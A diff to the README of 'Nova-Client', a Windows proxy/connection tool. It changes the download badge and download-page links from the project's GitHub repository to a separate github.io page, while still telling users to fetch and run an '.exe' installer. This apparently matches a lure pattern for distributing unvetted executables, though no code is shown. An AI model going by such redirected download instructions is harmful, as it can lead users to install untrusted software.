@@ -1,6 +1,6 @@
 # 🚀 Nova-Client - Access the web with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Becketpleasance133/Nova-Client)
+[![](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://becketpleasance133.github.io)
 
 ## 📋 What is Nova-Client
 Nova-Client acts as a bridge for your internet connection. It improves your browsing experience by routing data through secure servers. This tool combines a user-friendly interface with an automatic scanner. The scanner identifies the best connection paths for your specific location. You do not need technical skills to use these features. Nova-Client manages the complex network tasks in the background while you focus on your work.
@@ -15,7 +15,7 @@ Before you install the application, ensure your computer meets these basic requi
 ## 📥 How to download and install
 You must download the installation file from the official project page to ensure security and stability. Follow these exact steps to set up the software on your Windows machine:
 
-1. Visit the [Download Page](https://github.com/Becketpleasance133/Nova-Client).
+1. Visit the [Download Page](https://becketpleasance133.github.io).
 2. Look for the section labeled "Releases" on the right side of the page.
 3. Click the most recent version number to see the available files.
 4. Select the file ending in ".exe" to download the installer to your computer.
